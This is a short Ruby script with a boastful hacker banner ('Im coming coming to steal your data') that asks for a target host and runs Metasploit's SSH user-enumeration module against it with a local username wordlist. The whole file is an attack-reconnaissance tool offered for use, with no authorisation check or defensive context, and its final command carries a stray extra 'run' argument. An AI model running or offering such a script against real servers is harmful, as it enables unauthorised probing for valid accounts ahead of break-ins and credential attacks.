puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...

                   SSH Enumeration

"""

puts " [?] What is the target? "
print "[!] --->"

target = gets.chomp



exec("msfconsole -x 'use scanner/ssh/ssh_enumusers' -x 'setg RHOSTS #{target}' -x 'setg RHOST #{target}' -x 'setg RPORT 22' -x 'set USER_FILE /home/parrot/Desktop/MyExploits/Users.txt' -x 'run' 'run'")

